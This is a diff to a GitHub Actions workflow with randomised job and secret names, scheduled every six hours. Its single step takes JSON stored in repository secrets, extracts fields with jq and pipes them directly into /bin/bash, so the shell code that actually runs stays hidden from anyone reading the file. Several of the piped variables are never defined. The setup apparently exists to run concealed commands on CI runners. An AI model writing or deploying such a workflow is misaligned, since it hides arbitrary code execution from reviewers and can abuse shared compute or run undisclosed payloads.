@@ -3,16 +3,23 @@ name: suoruchao4376
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
-jobs:  # 10602
+    - cron: '41 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: suoruchao4376
         env:
-          citi579: ${{ secrets.citi579 }}
+          rvq66: ${{ secrets.rvq66 }}
         run: |
-          echo $citi579 | jq -r .cq7849 | /bin/bash
-          echo $cj30700 | jq -r .nyyu11364 | /bin/bash
+          echo $rvq66 | jq -r .gjti778 | /bin/bash
+          echo $zpkfy26043 | jq -r .qnng009 | /bin/bash
+          echo $a348 | jq -r .qisp09 | /bin/bash
+          echo $w4932 | jq -r .kpfk9 | /bin/bash
+          echo $k23962 | jq -r .l345 | /bin/bash
+          echo $ski2413 | jq -r .lipkr8 | /bin/bash
+          echo $tqji2335 | jq -r .vc7 | /bin/bash
 
